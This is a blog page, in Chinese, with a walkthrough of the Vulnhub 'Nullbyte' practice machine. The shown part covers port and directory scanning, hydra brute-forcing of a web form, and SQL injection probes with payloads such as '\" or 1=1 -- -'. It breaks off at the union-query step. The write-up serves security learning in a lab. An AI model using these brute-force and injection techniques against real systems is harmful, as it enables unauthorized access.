@@ -1,0 +1,522 @@
+<!DOCTYPE html><html lang="zn-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Vulnhub-Nullbyte | </title><meta name="keywords" content="Vulnhub"><meta name="author" content="xxshh"><meta name="copyright" content="xxshh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Vulnhub-Nullbyte"><meta name="application-name" content="Vulnhub-Nullbyte"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Vulnhub-Nullbyte"><meta property="og:url" content="http://example.com/2024/12/30/Vulnhub-Nullbyte/index.html"><meta property="og:site_name" content=""><meta property="og:description" content="0x00 Introduction这个靶场涉及的知识点很多，值得一练。  0x01 端口扫描首先对所有端口进行 TCP 扫描： sudo nmap -sT --min-rate 10000 -p- 192.168.86.130   接下来对这个四个端口进行详细信息扫描: sudo nmap -sT"><meta property="og:locale" content="zn-CN"><meta property="og:image" content="https://xxshh.github.io/images/%E6%A9%99.jpg?_r_=9e8de67c-de60-be2f-9752-9af783d619f3"><meta property="article:author" content="xxshh"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://xxshh.github.io/images/%E6%A9%99.jpg?_r_=9e8de67c-de60-be2f-9752-9af783d619f3"><meta name="description" content="0x00 Introduction这个靶场涉及的知识点很多，值得一练。  0x01 端口扫描首先对所有端口进行 TCP 扫描： sudo nmap -sT --min-rate 10000 -p- 192.168.86.130   接下来对这个四个端口进行详细信息扫描: sudo nmap -sT"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2024/12/30/Vulnhub-Nullbyte/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: undefined,
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: xxshh","link":"链接: ","source":"来源: ","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: '',
+  title: 'Vulnhub-Nullbyte',
+  postAI: '',
+  pageFillDescription: '0x00 Introduction, 0x01 端口扫描, 0x02 Web渗透, 0x03 密码爆破, 0x04 SQL 注入, 0x05 ssh登录及SUID提权, 0x06 Conclusion这个靶场涉及的知识点很多值得一练端口扫描首先对所有端口进行扫描接下来对这个四个端口进行详细信息扫描除了端口和端口的服务之外其它两个端口不知道是干什么的按照惯例先探索端口渗透浏览器访问查看源代码这是一张名为的图片这里学到一个思路拿到图片之后先看看是否存在图片隐写先把这张图片下载下来再用命令确定文件类型发现确实是个文件使用查看该文件的元数据发现一个奇怪的字符串不知道是干什么的没什么思路就先目录爆破依次查看只有可以访问这是个数据库管理工具到这就束手无策了目前一点有用信息都没有学习红队笔记思路这个字符串除了可能是密码还可能是一个路径访问只有一个简单的输入框查看源代码提交方式是数据将被发送到文件进行处理输入框类型是注释告诉我们这个表单不连接到数据库密码并不复杂密码爆破那就试试弱口令尝试了一些简单密码都失败了那么就要尝试爆破了使用的模块成功爆破出密码不过大佬建议尽量少用图形化工具那么就用自带的再爆破一次多使用几次加深印象密码暴力破解工具九头蛇使用详解及实战深空博客园爆破值这是表单返回的错误提示字符串根据该字符串判断当前尝试是否失败指定用户名但在这里无意义随便写一个就行指定爆破脚本输入进入下一个页面查看源代码数据将被发送到文件进行处理提交方式是除此之外没什么有用信息了既然是要搜索用户名那一定和数据库有关系会不会存在注入注入首先尝试构造闭合看会不会报错由此判断闭合方式是双引号构造个万能密码这里注意注释的方式以前我习惯用注释但这仅适用于而适用于大多数数据库因为要求后必须有个空格所以使用这种格式方便观察加没加空格由此判断此处确实存在注入漏洞接下来介绍四种注入方式手工注入首先确定字段数不报错报错说明有个字段接下来使用联合查询爆数据库名数据库版本和当前登录用户当前数据库名是版本高于存在这个表当前用户是获取表名只有一张名为的表获取列名获取用户名及密码这组密码没识别出来那么根据经验猜测这是密码解密这串字符再用识别一下解密至此得到了一组用户信息用户名是密码是第一种方法展示完毕写入一句话木马已知后端语言是一句话木马如下已知服务器是那么网站根目录就是目录爆破爆破的时候扫出了上传文件夹名称是这个文件夹是一定有写入权限的接下来就可以写入一句话木马了注意引号嵌套问题实战中如果写入不成功的话那么就是数据库参数设置的问题如果这个参数为空那么这个变量没有效果如果这个参数设为一个目录名那么服务只允许在这个目录中执行文件的导入和导出操作如果这个参数为服务会禁止导入和导出操作通过参数执行命令试试后门上传成功秉承着少用图形化工具的原则还是用命令行操作查看文件注意空格用编码得到了数据库的用户名及密码现在就可以登录了获取用户名密码写入反弹既然可以写入一句话木马那么也可以写入反弹语句启动一个进程同样写入目录这次文件名指定为注意转义优先使用双引号包裹外层字符串这里需要编码这里卡了挺长时间最后还是求助了知道原来是被转义了以后再遇到这种复杂命令最好用编码后写入本机开放监听端口访问即可触发反弹查看即可找到数据库用户名及密码登录及提权用户名是密码是接下来就可以登录了注意靶机的服务不是在默认的端口而是端口接下来就是查看该用户的权限查看权限没有权限定时任务也没有操作空间这里又学到一个思路输入查看历史记录发现一个陌生的命令这个命令是在目录下进入该目录查看文件权限发现的权限有位也就是有权限接下来的思路就类似于之前做过的了执行发现他执行了和命令我们可以构造其中任意一个命令添加到环境变量中以为例在当前的文件夹创建一个文件内容是给添加可执行权限并将添加到环境变量会按照中的路径顺序依次在这些目录中搜索名为的可执行文件找到后立即执行不再继续查找再次执行逻辑是没错的但是提权失败了还是经过求助发现换成就可以了除了创建文件之外还有一种稍微简单的方法建立软连接然后再添加环境变量也是一样的切换到身份后发现和权限是一样的大佬说是被限制了执行后权限降低了这个靶场属实是困住我太长时间了过程中遇到很多问题最后都是经过求助才解决的虽然花了很长时间不过以后再遇到类似情况也知道如何排查问题了过程中操作更熟练了理解得也更深了就是要有越挫越勇的态度',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-30 23:30:51',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="" type="application/atom+xml">
+</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://xxshh.github.io/images/Avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title"></div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/12/"><span class="card-archive-list-date">December 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">20</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">November 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">October 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/09/"><span class="card-archive-list-date">September 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">August 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/Vulnhub/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Vulnhub</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Vulnhub-Nullbyte</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-12-30T05:04:45.000Z" title="发表于 2024-12-30 13:04:45">2024-12-30</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-12-30T15:30:51.593Z" title="更新于 2024-12-30 23:30:51">2024-12-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="Vulnhub-Nullbyte"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为北京"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>北京</span></div></div></div><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2024/12/30/Vulnhub-Nullbyte/"><header><a href="/tags/Vulnhub/" tabindex="-1" itemprop="url">Vulnhub</a><h1 id="CrawlerTitle" itemprop="name headline">Vulnhub-Nullbyte</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">xxshh</span><time itemprop="dateCreated datePublished" datetime="2024-12-30T05:04:45.000Z" title="发表于 2024-12-30 13:04:45">2024-12-30</time><time itemprop="dateCreated datePublished" datetime="2024-12-30T15:30:51.593Z" title="更新于 2024-12-30 23:30:51">2024-12-30</time></header><h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>这个靶场涉及的知识点很多，值得一练。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230232350.png"></p>
+<h1 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h1><p>首先对所有端口进行 TCP 扫描：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT --min-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">192.168.86.130</span><br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230130836.png"></p>
+<p>接下来对这个四个端口进行详细信息扫描:</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -sT -sC -sV -O -p80,<span class="hljs-number">111</span>,<span class="hljs-number">777</span>,<span class="hljs-number">47901</span> <span class="hljs-number">192.168.86.130</span><br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230131200.png"></p>
+<p>除了 80 端口和 777 端口的 ssh 服务之外，其它两个端口不知道是干什么的。按照惯例，先探索 80 端口。</p>
+<h1 id="0x02-Web渗透"><a href="#0x02-Web渗透" class="headerlink" title="0x02 Web渗透"></a>0x02 Web渗透</h1><p>浏览器访问 <a target="_blank" rel="noopener" href="http://192.168.86.130/">http://192.168.86.130</a> :</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230132034.png"></p>
+<p>查看源代码，这是一张名为 main.gif 的图片。这里学到一个思路，拿到图片之后，先看看是否存在图片隐写。</p>
+<p>先把这张图片下载下来：</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">wget http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.86.130/main.gif</span><br></code></pre></td></tr></table></figure>
+
+<p>再用 <code>file</code> 命令确定文件类型，发现确实是个 .gif 文件。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230133334.png"></p>
+<p>使用 <code>Exiftool</code> 查看该文件的元数据：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230134739.png"></p>
+<p>发现一个奇怪的字符串，不知道是干什么的。</p>
+<p>没什么思路就先目录爆破：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> gobuster dir -u http://<span class="hljs-number">192.168.86.130</span> --wordlist /usr/share/dirbuster/wordlists/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-medium.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230135357.png"></p>
+<p>依次查看，只有<code>/phpmyadmin</code>可以访问，这是个数据库管理工具：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230135651.png"></p>
+<p>到这就束手无策了，目前一点有用信息都没有。学习红队笔记思路，<code>kzMb5nVYJw</code>这个字符串除了可能是密码，还可能是一个 web 路径。</p>
+<p>访问 <a target="_blank" rel="noopener" href="http://192.168.86.130/kzMb5nVYJw">http://192.168.86.130/kzMb5nVYJw</a> :</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230140448.png"></p>
+<p>只有一个简单的输入框。查看源代码：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230140543.png"></p>
+<p>提交方式是 POST，数据将被发送到 index.php 文件进行处理，输入框类型是 password。注释告诉我们这个表单不连接到 mysql 数据库，密码并不复杂。</p>
+<h1 id="0x03-密码爆破"><a href="#0x03-密码爆破" class="headerlink" title="0x03 密码爆破"></a>0x03 密码爆破</h1><p>那就试试弱口令？尝试了一些简单密码，都失败了。那么就要尝试爆破了。</p>
+<p>使用 BurpSuite 的 Intruder 模块成功爆破出密码：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230143030.png"></p>
+<p>不过大佬建议尽量少用图形化工具，那么就用 kali 自带的 <code>hydra</code> 再爆破一次，多使用几次加深印象。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shenkong/p/17410881.html">密码暴力破解工具——九头蛇（hydra）使用详解及实战 - 深空89 - 博客园</a></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">hydra <span class="hljs-number">192.168</span>.<span class="hljs-number">86.130</span> http-form-post <span class="hljs-string">&quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&quot;</span> -l xxshh -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br><span class="hljs-comment"># ^PASS^:爆破值</span><br><span class="hljs-comment"># invalid key：这是表单返回的错误提示字符串。根据该字符串判断当前尝试是否失败。</span><br><span class="hljs-comment"># -l:指定用户名，但在这里无意义，随便写一个就行</span><br><span class="hljs-comment"># -P：指定爆破脚本</span><br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230154615.png"></p>
+<p>输入 elite，进入下一个页面：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230145403.png"></p>
+<p>查看源代码：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230145643.png"></p>
+<p>数据将被发送到 420search.php 文件进行处理，提交方式是 GET，除此之外没什么有用信息了。</p>
+<p>既然是要搜索用户名，那一定和数据库有关系，会不会存在 sql 注入？</p>
+<h1 id="0x04-SQL-注入"><a href="#0x04-SQL-注入" class="headerlink" title="0x04 SQL 注入"></a>0x04 SQL 注入</h1><p>首先尝试构造闭合，看会不会报错：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230151423.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230151642.png"></p>
+<p>由此判断闭合方式是双引号。</p>
+<p>构造个万能密码：</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot; or 1=1 -- -</span><br></code></pre></td></tr></table></figure>
+
+<p>这里注意注释的方式。以前我习惯用 <code>#</code> 注释，但这仅适用于 MySQL。而<code>--</code>适用于大多数数据库。因为要求<code>--</code>后必须有个空格，所以使用<code>-- -</code>这种格式方便观察加没加空格。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230154742.png"></p>
+<p>由此判断此处确实存在 sql 注入漏洞。接下来介绍四种 sql 注入方式、</p>
+<ol>
+<li><strong>手工注入</strong></li>
+</ol>
+<p>首先确定字段数，<code>order by 3 -- -</code> 不报错，<code>order by 4 -- -</code> 报错，说明有 3 个字段。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230155834.png"></p>
+<p>接下来使用联合查询爆数据库名，数据库版本和当前登录用户：</p>
